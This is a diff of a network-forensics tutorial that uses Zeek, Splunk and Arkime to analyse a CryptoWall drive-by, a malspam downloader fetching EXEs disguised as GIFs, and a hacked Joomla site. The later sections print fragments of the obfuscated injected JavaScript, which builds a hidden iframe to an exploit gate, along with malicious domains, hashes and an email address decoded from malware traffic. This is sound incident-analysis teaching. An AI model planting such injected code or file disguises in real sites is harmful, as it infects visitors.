+!!! note "Use the capture time, not the server's `Date:`"
+    The server's `Date:` header says 22:17:14 for a reply captured at 22:16:48 — the server clock is about 26 s off. Times in a report come from `ts` / the capture.
 
 **Conclusion for PC A:**
 
-- **[data]** Hacked site → EK landing → Flash → encrypted payload → new `MSIE 7.0` program checking in to hacked sites → the user opened the CryptoWall payment page. "Windows 7 (x64)" on the page matches this PC.
-- **[inference]** Files on Hokaydoo-PC are encrypted by **CryptoWall**. Network shares it could write to may also be affected.
+- **[data]** Google result → hacked koeppl.com → hidden iframe → EK landing → Flash → encrypted payload → new `MSIE 7.0` program checking in to hacked sites (C2 list) → the user opened the CryptoWall payment page and typed its captcha.
+- **[inference]** A drive-by download: the only click was the Google result. Files on Hokaydoo-PC are encrypted by **CryptoWall**; network shares it could write to may also be affected. Tell the response team before anyone pays.
 
 ---
 
 ## Step 4 — PC B: 192.168.122.130 FULL-METAL-JACK { #pc-b }
 
-### 4-1. Webmail, then a script { #pc-b-timeline }
+### 4-1. The script's requests { #pc-b-requests }
+
+Step 1 showed .130 using `MSIE 7.0` from 22:11:53 (9 requests). Spread them out:
 
 ```spl
-index=zeek pcap_case=20160107_ALERTS_ON_3_DIFFERENT_HOSTS id_orig_h=192.168.122.130 (sourcetype=zeek:ssl OR sourcetype=zeek:http) ts>=1452204300
-| eval name=coalesce(server_name, mvdedup(host))
-| eval t=strftime(ts,"%H:%M:%S")
-| stats min(t) as first max(t) as last count by sourcetype name
-| sort first
+index=zeek sourcetype=zeek:http id_orig_h=192.168.122.130 user_agent="*MSIE 7.0*"
+| eval time=strftime(ts, "%H:%M:%S.%3N")
+| table time, id_resp_h, host, uri, referrer, status_code, resp_mime_types, response_body_len
+| sort time
 ```
 
-- Two log types at once: `(sourcetype=zeek:ssl OR sourcetype=zeek:http)`. `ts>=1452204300` = from 22:05:00.
-- `coalesce(a,b)` = take `a`, or `b` if `a` is empty. HTTPS rows have `server_name` (the **SNI**, the site name sent before encryption); HTTP rows have `host`.
+- Line 1: `user_agent="*MSIE 7.0*"` — `*` = any text before or after.
+- Line 2: `eval` makes a new field: `ts` as `22:11:53.882`. `%3N` = milliseconds.
+- Line 3: `table` shows only these fields, in this order.
 
-**What you should see (key rows):**
+**What you should see (the long `id=` shortened):**
 
 ```text
-sourcetype  name                              first     last
-zeek:ssl    www.bing.com                      22:06:35  22:06:59
-zeek:http   mail.yahoo.com                    22:07:00  22:07:00
-zeek:ssl    login.yahoo.com                   22:07:05  22:07:33
-zeek:ssl    us-mg5.mail.yahoo.com             22:07:00  22:11:47
-zeek:ssl    prodxobni.mail.yahoo.com / ws-contacts / comet.yahoo.com ...
-zeek:http   ma-wt.com.sa                      22:11:53  22:12:30
-zeek:http   dariostoka.com                    22:11:55  22:12:34
-zeek:http   freshanointingministries-sc.org   22:11:57  22:12:47
+time          id_resp_h       host                             uri                          status  resp_mime_types        response_body_len
+22:11:53.882  216.158.85.7    ma-wt.com.sa                     /counter/?id=5553…5E55&rnd=8742951  200                          0
+22:11:55.525  174.36.186.235  dariostoka.com                   /counter/?id=5553…5E55&rnd=8742951  200                          0
+22:11:57.453  184.168.173.1   freshanointingministries-sc.org  /counter/?id=5553…5E55&rnd=8742951  200                          0
+22:11:58.285  216.158.85.7    ma-wt.com.sa                     /counter/?id=5553…5E55&rnd=8742952  200     application/x-dosexec  260613
+22:12:04.091  174.36.186.235  dariostoka.com                   /counter/?id=5553…5E55&rnd=8742952  200     application/x-dosexec  260613
+22:12:21.976  184.168.173.1   freshanointingministries-sc.org  /counter/?id=5553…5E55&rnd=8742952  200     application/x-dosexec  260619
+22:12:30.633  216.158.85.7    ma-wt.com.sa                     /counter/?id=5553…5E55&rnd=8742953  200     application/x-dosexec  114688
+22:12:34.317  174.36.186.235  dariostoka.com                   /counter/?id=5553…5E55&rnd=8742953  200     application/x-dosexec  114688
+22:12:47.942  184.168.173.1   freshanointingministries-sc.org  /counter/?id=5553…5E55&rnd=8742953  200     application/x-dosexec  145922
 ```
 
 **[data] Reading:**
 
-- 22:06–22:07: Bing, then the user **logs in to Yahoo Mail** (`login.yahoo.com`) and uses it (`us-mg5.mail.yahoo.com`). Webmail is HTTPS — **you cannot see the emails or attachments**.
-- **22:11:45–47** last webmail connections → **22:11:53**, 6 s later, the `MSIE 7.0` program starts (candidate 3). The DHCP INFORM from 1-4 is at 22:11:53 too.
-- **[inference]** The user opened something from an email (an attachment) and a **script** ran. The `MSIE 7.0` User-Agent with no Referer fits Windows Script Host (`.js` file).
+- **The same `id=` on all 9.** `rnd=` is not random: it **counts up by one** per round (…51, …52, …53). **[inference]** `id` = who is asking, `rnd` = "give me file number N".
+- **No `referrer` field at all** — Zeek leaves empty fields out of JSON, so there was **no Referer**: a program, not a web page.
+- Round 1 returned **0 bytes** everywhere; rounds 2 and 3 returned **Windows programs** (`application/x-dosexec`).
+- **The same site order every round**, and it downloads from all three even after the first one worked. Unlike PC A's C2 (try the next server only on failure), this script walks a **list of mirrors**. The whole run took **54 s**.
 
-### 4-2. The downloads: "GIF" files that are programs { #pc-b-downloads }
-
-```spl
-index=zeek sourcetype=zeek:http pcap_case=20160107_ALERTS_ON_3_DIFFERENT_HOSTS id_orig_h=192.168.122.130 uri="/counter/*"
-| eval host=mvdedup(host)
-| rex field=uri "rnd=(?<rnd>\d+)"
-| eval t=strftime(ts,"%H:%M:%S")
-| table t id_resp_h host rnd status_code resp_filenames resp_mime_types response_body_len
-```
-
-- `uri="/counter/*"` — only these requests.
-- `rex field=uri "rnd=(?<rnd>\d+)"` — cut the number after `rnd=` into a new field `rnd` (`\d+` = one or more digits).
-- `resp_filenames` = the file name the server suggested (`Content-Disposition: attachment; filename=…`). `resp_mime_types` = what Zeek found **inside**.
-
-**What you should see:**
+### 4-2. Decoding `id=` (CyberChef) { #pc-b-id }
 
 ```text
-t         id_resp_h       host                              rnd      status  resp_filenames        resp_mime_types         response_body_len
-22:11:53  216.158.85.7    ma-wt.com.sa                      8742951  200                                                   0
-22:11:55  174.36.186.235  dariostoka.com                    8742951  200     775d4.gif                                     0
-22:11:57  184.168.173.1   freshanointingministries-sc.org   8742951  200                                                   0
-22:11:58  216.158.85.7    ma-wt.com.sa                      8742952  200     66b32.gif             application/x-dosexec   260613
-22:12:04  174.36.186.235  dariostoka.com                    8742952  200     174125.gif            application/x-dosexec   260613
-22:12:21  184.168.173.1   freshanointingministries-sc.org   8742952  200     c9a63078fe7d3741.gif  application/x-dosexec   260619
-22:12:30  216.158.85.7    ma-wt.com.sa                      8742953  200     250acae.gif           application/x-dosexec   114688
-22:12:34  174.36.186.235  dariostoka.com                    8742953  200     d50f729942631.gif     application/x-dosexec   114688
-22:12:47  184.168.173.1   freshanointingministries-sc.org   8742953  200     2487ff63fb4e79.gif    application/x-dosexec   145922
+55535C5E06160B0B0F014A0C05090D08100B0A241605070F17140507014A070B4A110F5E3C5E170503010901000D054A0B16035E17555E55505156555C5C5653525E55
 ```
 
-**[data] Reading:**
+- Only `0-9 A-F` → **hex**. 136 characters = 68 bytes.
+- Decoded as hex it is unreadable, but some bytes repeat (`4A` several times). Real encryption rarely repeats like that; a **1-byte XOR** does — the same character always turns into the same byte.
 
-- **The same long `id=` on every request** — one victim ID — and `rnd` counting **…51, …52, …53**: three rounds, each round asking **all three sites**. A script working through a list.
-- Round 1 got nothing. Rounds 2 and 3 got **six files**.
-- The server says **`image/gif`** and names them `.gif`. Zeek looked inside: **`application/x-dosexec` = a Windows program** (starts with `MZ`). A disguise to get past filters that only read the label.
-- No Referer, `MSIE 7.0` — not the browser.
-
-### 4-3. Hashes (Splunk) { #pc-b-hashes }
-
-```spl
-index=zeek sourcetype=zeek:files pcap_case=20160107_ALERTS_ON_3_DIFFERENT_HOSTS rx_hosts="192.168.122.130" mime_type="application/x-dosexec"
-| eval t=strftime(ts,"%H:%M:%S")
-| stats min(t) as first count values(tx_hosts) as from by md5 seen_bytes
-```
-
-- `stats … by md5 seen_bytes` groups identical files: how many times each was downloaded and from where.
+CyberChef: **From Hex** → **XOR Brute Force** (Key length **1**, Sample length **100**, Print key **on**). Add the crib `.co` to keep only matching lines.
 
 ```text
-md5                                 seen_bytes  first     count  from
-9f756e72eacc6b805481a49ce51c4a79    260613      22:11:58  2      216.158.85.7 174.36.186.235
-d411bf37de7f72e98a62fc82917f50f7    260619      22:12:21  1      184.168.173.1
-e851eb249d2c38d56d1b496a3112cebc    114688      22:12:30  2      216.158.85.7 174.36.186.235
-92a4d0aeede3ce110b4121342df48496    145922      22:12:47  1      184.168.173.1
+Key = 64: 178:brooke.hamilton@rackspace.co.uk:X:sagemedia.org:s1:1452188276:1
 ```
 
-**[data]** 6 downloads, **4 different EXEs**. If you have `zeek:pe`, `index=zeek sourcetype=zeek:pe pcap_case=… | table ts id os compile_ts is_exe` shows they are Windows executables. These MD5s are of the **real programs** (not encrypted) — the host team can search for them on disk.
+| Part | Value | Meaning |
+|---|---|---|
+| 2 | `brooke.hamilton@rackspace.co.uk` | **an email address** [data] |
+| 4 | `sagemedia.org` | a domain — **[inference]** sender side or campaign mark |
+| 6 | `1452188276` | **Unix time** = 2016-01-07 **17:37:56** UTC (`| makeresults | eval t=strftime(1452188276,"%Y-%m-%d %H:%M:%S")`) |
+| 1, 3, 5, 7 | `178`, `X`, `s1`, `1` | unknown — **[inference]** campaign or version marks |
 
-SHA256 (for the host team and for malware databases):
+**[inference] Why it matters:** the script carries an email address and a time **4.5 h before** it ran. That fits a file **made for an email** and opened later — evidence for "malspam attachment" even though the mail itself is hidden in HTTPS. The mail team can search for the address or `sagemedia.org` to find other recipients. Whether it is the user's own address is not visible (the user used Yahoo Mail).
+
+### 4-3. The downloads: "GIF" files that are programs (Splunk + Arkime) { #pc-b-downloads }
+
+```spl
+index=zeek sourcetype=zeek:files rx_hosts="192.168.122.130" mime_type="application/x-dosexec"
+| eval time=strftime(ts, "%H:%M:%S.%3N")
+| table time, tx_hosts, filename, seen_bytes, md5, sha256
+| sort time
+```
+
+```text
+time          tx_hosts        filename              seen_bytes  md5
+22:11:58.680  216.158.85.7    66b32.gif             260613      9f756e72eacc6b805481a49ce51c4a79
+22:12:04.612  174.36.186.235  174125.gif            260613      9f756e72eacc6b805481a49ce51c4a79
+22:12:22.606  184.168.173.1   c9a63078fe7d3741.gif  260619      d411bf37de7f72e98a62fc82917f50f7
+22:12:31.277  216.158.85.7    250acae.gif           114688      e851eb249d2c38d56d1b496a3112cebc
+22:12:35.088  174.36.186.235  d50f729942631.gif     114688      e851eb249d2c38d56d1b496a3112cebc
+22:12:48.574  184.168.173.1   2487ff63fb4e79.gif    145922      92a4d0aeede3ce110b4121342df48496
+```
+
+Group identical files:
+
+```spl
+index=zeek sourcetype=zeek:files rx_hosts="192.168.122.130" mime_type="application/x-dosexec"
+| stats count, values(tx_hosts) as servers, values(seen_bytes) as size by md5
+```
+
+- `stats … by md5` = one group per file fingerprint. `values(tx_hosts) as servers` = which servers sent it.
+
+**[data] 6 downloads, 4 different EXEs.** ma-wt and dariostoka gave **the same file** for the same `rnd` (same MD5) — **[inference]** one file placed on several hacked sites. freshanointing gave different files. Every name is **random + `.gif`**, different per site even for the same file.
+
+SHA256 (for the host team):
 
 ```text
 95a9c8fccbe0e49dc132cf59d7ebf73e692da9f35491e0bfcac40b92c9022f5c  (260,613 B)
@@ -565,23 +689,150 @@ SHA256 (for the host team and for malware databases):
 227193160a2448dfa8bbbd2cf125afa9cca0d1a718b109a3adae5df8a24cdf6e  (145,922 B)
 ```
 
-### 4-4. Anything after the downloads? { #pc-b-after }
+What did the server **say**? Arkime:
+
+```text
+tags == 20160107_ALERTS_ON_3_DIFFERENT_HOSTS && ip.src == 192.168.122.130 && http.uri == */counter/*
+```
+
+```text
+HTTP/1.1 200 OK                                   ← round 1 (rnd=…51)
+Content-Type: text/html
+Content-Encoding: gzip
+Content-Length: 119                               ← 119 B of gzip = 0 B unzipped
+
+HTTP/1.1 200 OK                                   ← round 2 (rnd=…52), same connection
+Content-Length: 260613
+Content-Type: image/gif
+Server: Microsoft-IIS/7.5
+X-Powered-By: PHP/5.3.28
+Content-Disposition: attachment; filename=66b32.gif
+
+MZ…This program cannot be run in DOS mode…PE…text…data…rsrc
+```
+
+| | The server said | The content (Zeek) |
+|---|---|---|
+| Type | `image/gif` | `application/x-dosexec` |
+| Name | `.gif` | a Windows EXE (`MZ`, `PE`, `.text`, `.rsrc`) |
+
+**[inference]** A disguise for filters that only read the extension or `Content-Type`. Trust Zeek's `mime_type` (from content), not the label. Note that one Arkime session (port 49220) holds **both** round 1 and round 2 — keep-alive again.
+
+### 4-4. Before the script: webmail over HTTPS { #pc-b-webmail }
+
+Email is HTTPS, so contents are hidden. The **SNI** (the server name sent in clear before encryption) still shows which service was used and when.
 
 ```spl
-index=zeek sourcetype=zeek:conn pcap_case=20160107_ALERTS_ON_3_DIFFERENT_HOSTS id_orig_h=192.168.122.130 ts>=1452204775
-| eval t=strftime(ts,"%H:%M:%S")
-| stats min(t) as first count by id_resp_h id_resp_p service
+index=zeek sourcetype=zeek:ssl id_orig_h=192.168.122.130
+| stats min(ts) as first, max(ts) as last, count by server_name
+| eval first=strftime(first, "%H:%M:%S.%3N"), last=strftime(last, "%H:%M:%S.%3N")
 | sort first
 ```
 
-- `ts>=1452204775` = from **22:12:55**, after the last download ended.
+- Line 2: one row per SNI: first connection, last connection, number of connections.
+- Line 3: both times readable in one `eval` (comma-separated).
 
-**What you should see:** only Yahoo Mail connections (124.108.101.10, 106.10.x) and DNS. **[data] No new destination after the downloads.**
+```text
+server_name                first         last          count
+www.bing.com               22:06:35.382  22:06:59.726  11
+login.live.com             22:06:41.475  22:07:03.451  2
+us-mg5.mail.yahoo.com      22:07:00.155  22:16:54.459  12
+mail.yahoo.com             22:07:01.903  22:07:37.178  2
+login.yahoo.com            22:07:05.562  22:07:33.619  5
+prodxobni.mail.yahoo.com   22:08:13.677  22:08:13.894  2
+ws-contacts.progrss.yahoo.com  22:08:13.894  22:08:13.894  2
+… (other *.yahoo.com, *.yimg.com)
+```
+
+**[data]** Bing → **Yahoo Mail** login at 22:07. The mail server `us-mg5` runs **until 22:16:54 — after the downloads**. So "last mail connection" says nothing yet: `stats` shows only the first and last of 12 connections.
+
+### 4-5. Is the webmail traffic the user, or the page itself? { #pc-b-rhythm }
+
+```spl
+index=zeek sourcetype=zeek:ssl id_orig_h=192.168.122.130 server_name="us-mg5.mail.yahoo.com"
+| sort ts
+| delta ts as gap
+| eval time=strftime(ts, "%H:%M:%S.%3N"), gap=round(gap, 1)
+| table time, id_orig_p, id_resp_h, gap
+```
+
+- Line 2 **must** come before `delta`: `delta` compares each row with the row **above** it.
+- `delta ts as gap` = this row's `ts` minus the previous row's `ts` = seconds since the last connection.
+- `round(gap, 1)` = one decimal.
+
+```text
+time          id_orig_p  gap
+22:07:00.155  49174
+22:08:33.335  49210      93.2
+22:10:42.271  49216      128.9
+22:10:42.274  49217      0.0
+22:11:45.130  49219      62.9
+22:11:47.467  49218      2.3
+22:13:48.903  49227      121.4
+22:13:49.157  49228      0.3
+22:14:51.292  49230      62.1
+22:14:54.025  49229      2.7
+22:16:54.459  49231      120.4
+22:16:54.459  49232      0.0
+```
+
+**[data] A rhythm:** from 22:10:42 the connections come **in pairs**, about **2 min → 1 min → 2 min → 1 min** apart. People do not click to a clock. **[inference]** The Yahoo Mail page checking for new mail **by itself**. The pair at 22:11:45/47 — 6 s before the first download — is part of that rhythm, so it is **not** a user action. The real user activity (login, mail, contacts) ends at about **22:08:47**.
+
+!!! warning "Trap: Arkime's graph puts a session's bytes at its **end**"
+    In Arkime (`ip.src == 192.168.122.130 && port.dst == 443`, graph **Data bytes** + **Bars**) there is one huge bar of **1,650,773 bytes at 22:10:42**. It looks like a big download at 22:10:42. It is not: the two connections opened then have 9 and 6 packets. Check which connections **ended** then:
+
+    ```spl
+    index=zeek sourcetype=zeek:conn id_orig_h=192.168.122.130 id_resp_p=443
+    | eval end=ts+duration
+    | where end>=1452204641 AND end<1452204643
+    | eval start=strftime(ts, "%H:%M:%S"), end=strftime(end, "%H:%M:%S.%3N")
+    | table start, end, id_orig_p, id_resp_h, resp_bytes
+    | addcoltotals resp_bytes
+    ```
+
+    - `end = ts + duration` = when each connection closed. `where` keeps 22:10:41–22:10:43. `addcoltotals` adds a total row.
+    - **[data] 19 connections**, opened 22:06:59–22:08:47, all **closed at 22:10:41.8–22:10:42.9**; total `resp_bytes` **1,646,923** ≈ the Arkime bar. The graph places all of a session's bytes at its **last packet** (the **Bounding: Last Packet** setting). The real mail data flowed 22:07–22:09.
+
+### 4-6. Anything new after the downloads? { #pc-b-after }
+
+Destinations **first seen** after 22:11:53 — over the whole capture, so "seen before" is known:
+
+```spl
+index=zeek sourcetype=zeek:conn id_orig_h=192.168.122.130
+| stats min(ts) as first_seen, count, sum(resp_bytes) as resp_bytes by id_resp_h, id_resp_p
+| where first_seen>=1452204713
+| eval first_seen=strftime(first_seen, "%H:%M:%S.%3N")
+| sort first_seen
+```
+
+- No time filter on line 1 — on purpose. Line 3 keeps destinations whose **first** contact is after 22:11:53 (1452204713). Compare **before** turning the number into text (line 4).
+
+```text
+id_resp_h       id_resp_p  first_seen    count  resp_bytes
+216.158.85.7    80         22:11:53.451  1      376115
+174.36.186.235  80         22:11:55.008  3      376181
+184.168.173.1   80         22:11:57.052  3      407337
+```
+
+Then every connection after the last download:
+
+```spl
+index=zeek sourcetype=zeek:conn id_orig_h=192.168.122.130 ts>1452204768
+| eval time=strftime(ts, "%H:%M:%S.%3N")
+| table time, id_resp_h, id_resp_p, service, conn_state, orig_bytes, resp_bytes
+| sort time
+```
+
+**[data] Reading:**
+
+- The only new destinations are the **3 download sites**. ma-wt has **1 connection** for 3 requests (keep-alive).
+- After 22:12:48: **8 connections, all 443** — `124.108.101.10` (us-mg5, **the same 2,019 / 1,499 bytes each time** = automatic), and two Yahoo IPs used before with 0 / 0 bytes. The last two are `S1` (still open when the capture ended).
+- **No DNS, no HTTP, no new User-Agent.**
 
 **Conclusion for PC B:**
 
-- **[data]** 6 s after webmail use, a script downloaded 4 different Windows programs (6 downloads) disguised as GIFs from 3 hacked websites.
-- **[inference]** The source is a **malspam email with a script attachment** (the original exercise confirms zipped `.js` attachments). The downloaded programs are malware; whether they ran is not visible — no follow-up traffic in the 4 remaining minutes. **Treat the PC as infected.**
+- **[data]** During a Yahoo Mail session, a script (`MSIE 7.0`, no Referer) downloaded 4 different Windows programs (6 downloads) disguised as GIFs from 3 hacked websites. The script's `id=` carries an email address and a time 4.5 h earlier.
+- **[inference]** A **malspam attachment** (likely `.js`). When it was opened is not visible (HTTPS). No follow-up traffic in the remaining 4 minutes: the EXEs may not have run yet, or may connect later. **Treat the PC as infected**; check the mailbox and the PC.
 
 ---
 
@@ -590,113 +841,223 @@ index=zeek sourcetype=zeek:conn pcap_case=20160107_ALERTS_ON_3_DIFFERENT_HOSTS i
 ### 5-1. From a search to a gate { #pc-c-chain }
 
 ```spl
-index=zeek sourcetype=zeek:http pcap_case=20160107_ALERTS_ON_3_DIFFERENT_HOSTS id_orig_h=192.168.122.52 ts>=1452204540 ts<=1452204570
-| eval host=mvdedup(host)
-| eval t=strftime(ts,"%H:%M:%S.%3N")
-| sort ts
-| table t host uri referrer status_code resp_mime_types response_body_len
+index=zeek sourcetype=zeek:http id_orig_h=192.168.122.52 ts>=1452204540 ts<1452204580
+| eval time=strftime(ts, "%H:%M:%S.%3N")
+| table time, host, uri, referrer, status_code, resp_mime_types, response_body_len
+| sort time
 ```
 
-- A 30-second window, 22:09:00 – 22:09:30, to see what happened just before and after the odd request.
-- \* For scripts Zeek may write `text/plain` or `application/javascript` — both mean "text, a script".
+- `ts>=` and `ts<` together make a time window: **22:09:00 – 22:09:40**.
 
 **What you should see (key rows):**
 
 ```text
-t              host                 uri                                    referrer                                     status  mime*        len
-22:09:05.759   ri.search.yahoo.com  /_ylt=…/RU=http%3a%2f%2fplanetside.co.uk%2f/…   http://au.search.yahoo.com/search?p=planetside.co.uk…
-22:09:12.190   planetside.co.uk     /                                      http://au.search.yahoo.com/search?p=…         200     text/html    23509
-22:09:20.017   planetside.co.uk     /media/system/js/mootools-core.js      http://planetside.co.uk/                     200     text/plain   99877
-22:09:23.764   planetside.co.uk     /media/system/js/core.js               http://planetside.co.uk/                     200     text/plain   4784
-22:09:24.829   st.domandvilma.com   /fvviewforumqn.php                     http://planetside.co.uk/                     200     text/plain   26
-22:09:26.423   planetside.co.uk     /media/system/js/caption.js            http://planetside.co.uk/                     200
+time          host                 uri                                    referrer                                         len
+22:09:01.063  l.yimg.com           /pv/static/lib/srp-core-js-…js          http://au.search.yahoo.com/search?p=planetside.co.uk…  306566
+22:09:05.759  ri.search.yahoo.com  /_ylt=…/RU=http://planetside.co.uk//…  http://au.search.yahoo.com/search?p=planetside.co.uk…  (302)
+22:09:12.190  planetside.co.uk     /                                      http://au.search.yahoo.com/search?p=…            23509
+22:09:20.017  planetside.co.uk     /media/system/js/mootools-core.js      http://planetside.co.uk/                         99877
+22:09:23.764  planetside.co.uk     /media/system/js/core.js               http://planetside.co.uk/                         4784
+22:09:24.829  st.domandvilma.com   /fvviewforumqn.php                     http://planetside.co.uk/                         26
+22:09:26.423  planetside.co.uk     /media/system/js/caption.js            http://planetside.co.uk/                         729
+22:09:27.331  ajax.googleapis.com  /ajax/libs/jquery/1.11.3/jquery.min.js http://planetside.co.uk/                         95992
+…             planetside.co.uk / ajax.aspnetcdn.com (more scripts and styles)
 ```
 
 **[data] Reading:**
 
-- The user searched Yahoo for `planetside.co.uk` and clicked the result — a 3-D landscape software site (Joomla).
-- **22:09:24 — `st.domandvilma.com/fvviewforumqn.php`**, Referer = the planetside page. Something on the page called a server that has nothing to do with planetside.
-- **The reply is only 26 bytes.** An EK landing page is kilobytes. Nothing from .52 goes anywhere odd after this.
+- The user **searched Yahoo for "planetside.co.uk"** and clicked the result: `ri.search.yahoo.com` answers **302** with `RU=http://planetside.co.uk//` (Yahoo records the click, then forwards). A deliberate visit, like PC A.
+- **22:09:24 — `st.domandvilma.com/fvviewforumqn.php`**, Referer = the planetside page. **The reply is only 26 bytes** — too small for an EK landing page (PC A's was 1,035 B).
+- After it: only planetside and Google/Microsoft CDNs (`googleapis`, `aspnetcdn`). The two `googleapis` 404s are old links on the site, not the attack.
+- **The Referer names the page, not the script.** Every script on the page sends the same Referer. The candidates by time are `mootools-core.js` (4.8 s before) and `core.js` (1.1 s before) — read them.
 
 ### 5-2. Which file called the gate? (Arkime) { #pc-c-inject }
 
-The Referer tells you **the page**, not **which script** on it. Use timing: the gate request comes right after `mootools-core.js` (22:09:20) and `core.js` (22:09:23). Open the larger one:
-
 ```text
-tags == 20160107_ALERTS_ON_3_DIFFERENT_HOSTS && ip.src == 192.168.122.52 && http.uri == /media/system/js/mootools-core.js
+tags == 20160107_ALERTS_ON_3_DIFFERENT_HOSTS && ip.src == 192.168.122.52 && http.uri == [planetside.co.uk/media/system/js/mootools-core.js, planetside.co.uk/media/system/js/core.js]
 ```
 
-Search the response (Ctrl+F) for **`viewforum`**. The name `domandvilma` itself is **not** in plain text — it is written with escape codes (`\x6d` = `m`, `n` = `n`). Near the end of the normal MooTools code you find code that does not belong there:
+- `[a, b]` = either value. Remember: Arkime's `http.uri` includes the host.
+
+**`core.js` — clean.** Normal **Joomla** code (`Joomla.submitform`, `Joomla.checkAll` …), nothing that calls another domain.
+
+**`mootools-core.js` — injected at the end.** MooTools is a well-known public library; attackers add code at the **start or end** of a file. Right after the library's last line (`…return eval(rs);}})();`) there is code between two random comments:
 
 ```text
-/* S4PoQHwRAGy */var jcvJp4p="\x75ser\x69dA0817FB25";var oD4RG9="30";
+/* S4PoQHwRAGy */var jcvJp4p="\x75se\u0072\x69dA08\u00317FB25";var oD4RG9="30";
 ...
-tdxwSOD.src="\x68ttp:\x2f/st.do\x6dandvilm\x61.com\x2f"+j7aMn(2,6)+"vi\x65wforum"+j7aMn(2,6)+".php"
+tdxwSOD.src="\x68ttp:\x2f/st.do\x6da\u006edvilm\x61.com\x2f"+j7aMn(2,6)+"v\u0069\x65wforum"+j7aMn(2,6)+"\u002ephp";
 ...
-function rkVOLS(){ ... if(main_color_handle.length==0){xco56v_(jcvJp4p,oD4RG9,48);return;} ...
-  var FCPKqK="<iframe ... src='"+mClKFF+"' width=19 height=19 frameborder=0 scrolling='no'></iframe>"; ...
+if(main_color_handle.length==0){xco56v_(jcvJp4p,oD4RG9,48);return;}
+...
+var FCPKqK="<iframe on\x6co\x61d=\u0027\x6d\u0045J\u0074\x51o(\x29;\u0027 src=\u0027"+mClKFF+"'\u0020w\x69dth=19 hei\u0067\x68\x74\x3d1\x39 \x66ramebor\u0064er=0 scroll\x69\u006eg=\u0027no\x27>\u003c/iframe>";
+... /* DwRn2gPflETI4EP3B6B */
 ```
 
-| Piece | Meaning |
-|---|---|
-| `"\x68ttp:\x2f/st.do\x6dandvilm\x61.com\x2f"` | `http://st.domandvilma.com/` with escape codes so a text search misses it |
-| `j7aMn(2,6)+"viewforum"+j7aMn(2,6)+".php"` | random letters + `viewforum` + random letters + `.php` → `fvviewforumqn.php` |
-| `if(main_color_handle.length==0){ … return; }` | **If the gate answers with an empty value, set a cookie and stop** |
-| `<iframe … width=19 height=19 …>` | Otherwise build a tiny hidden iframe to the address the gate gave — that would be the exploit kit |
+Ctrl+F for `domandvilma` finds **nothing** — the name is hidden with escape codes. That is a clue too.
 
-Now open the gate's reply:
+**How to read the escapes:** `\xNN` = the character with hex code NN (`\x68` = `h`, `\x2f` = `/`, `\x6d` = `m`, `\x61` = `a`). `\uNNNN` = the same with 4 digits (`\u006e` = `n`, `\u0069` = `i`, `\u002e` = `.`).
+
+| Code | Decoded | Meaning |
+|---|---|---|
+| `"\u0057in\x64ows"`, `"MSI\u0045"`, `"\u0047ec\u006bo"`, `"Trid\u0065n\u0074"` | Windows, MSIE, Gecko, Trident | Only **Windows + a normal browser** |
+| `tdxwSOD.src = "http://st.domandvilma.com/" + j7aMn(2,6) + "viewforum" + j7aMn(2,6) + ".php"` | the gate URL | `j7aMn(2,6)` = **2–6 random letters** |
+| `"SCR\u0049\x50T"` | SCRIPT | The gate is loaded as a `<script>` |
+| `if(main_color_handle.length==0){ … return; }` | empty value → stop | |
+| `<iframe … width=19 height=19 frameborder=0 scrolling='no'>` | a 19×19 iframe | otherwise: a hidden iframe to the gate's address |
+| `"op\u0061\u0063ity:0"` | opacity:0 | fully transparent |
+
+**[data] Match it:** the real request was `/fvviewforumqn.php` = `fv` + **`viewforum`** + `qn` + `.php`. The injected code in **mootools-core.js** made the gate request.
+
+**The gate's reply:**
 
 ```text
-tags == 20160107_ALERTS_ON_3_DIFFERENT_HOSTS && host.http == st.domandvilma.com
+tags == 20160107_ALERTS_ON_3_DIFFERENT_HOSTS && ip.src == 192.168.122.52 && host.http == st.domandvilma.com
 ```
 
 ```text
+GET /fvviewforumqn.php HTTP/1.1
+Accept: application/javascript, */*;q=0.8
+Referer: http://planetside.co.uk/
+User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)
+Host: st.domandvilma.com
+
 HTTP/1.1 200 OK
+Server: nginx/1.8.0
 Content-Type: text/javascript; charset=ISO-8859-1
-Set-Cookie: fltna=...; domain=st.domandvilma.com
+P3P: policyref="/w3c/p3p.xml", CP="NON DSP COR NID DEVa PSAa PSDa OUR BUS"
+Set-Cookie: fltna=…; expires=Fri, 06-Jan-2017 22:09:22 GMT; path=/; domain=st.domandvilma.com
+Content-Encoding: gzip
 
 var main_color_handle='';
 ```
 
-**[data] The gate answered with an empty value.** By the script's own logic it stops: no iframe, no exploit kit. That matches the traffic — nothing malicious after 22:09:24.
+- `Accept: application/javascript` — the browser asked for it **as a script** (matches `SCRIPT` in the code).
+- `Set-Cookie` for 1 year + `P3P` — **[inference]** IE blocks third-party cookies unless a P3P header is present; the gate wants to **recognise the visitor next time**.
+- Body: `var main_color_handle='';` — **26 bytes, an empty value**. The variable the injected code waits for is empty, so it takes the `length==0` branch: no iframe.
 
-**[inference] Why empty?** Gates like this hand out an EK address only to visitors they want (right browser, country, not seen before). This visit was filtered out. Lucky, but **the site is still hacked** — the next visitor may not be.
+**[inference] Why empty?** Gates choose who to attack (browser, country, IP, seen before). This visit was filtered out. The rules live on the server and cannot be seen.
 
-### 5-3. The rest of .52's traffic { #pc-c-rest }
+### 5-3. Proof that the code ran — the cookie (Arkime) { #pc-c-cookie }
 
-From 22:15:29 the user browses `www.outdoorsamoa.com` and TripAdvisor. Same check as 5-1 for that window: only the site, Google fonts and TripAdvisor resources; no unknown domains, no `MSIE 7.0`, no EXE in `zeek:files`.
+Same method as PC A (3-2): **what must the code leave behind if it ran?** With an empty gate value it calls `xco56v_(jcvJp4p, oD4RG9, 48)`. `xco56v_` writes `document.cookie` with `expires` and `domain=` + `document.domain` (= **planetside.co.uk**). The name and value are at the top of the code:
 
-```spl
-index=zeek sourcetype=zeek:files pcap_case=20160107_ALERTS_ON_3_DIFFERENT_HOSTS rx_hosts="192.168.122.52"
-| stats count by mime_type
+```text
+"\x75se\u0072\x69dA08\u00317FB25"  →  u se r i dA08 1 7FB25  →  useridA0817FB25
+oD4RG9 = "30"
 ```
 
-**What you should see:** images, `text/html`, `text/plain` (scripts), fonts — **no `application/x-dosexec`, no Flash**.
+So the code should create **`useridA0817FB25=30`** for 48 hours. Compare the `Cookie:` line of planetside requests before and after the gate:
 
-**Conclusion for PC C:** **[data]** An injected script on a hacked site contacted a gate; the gate returned nothing and no exploit or download followed. **Not infected.** Report the hacked site.
+```text
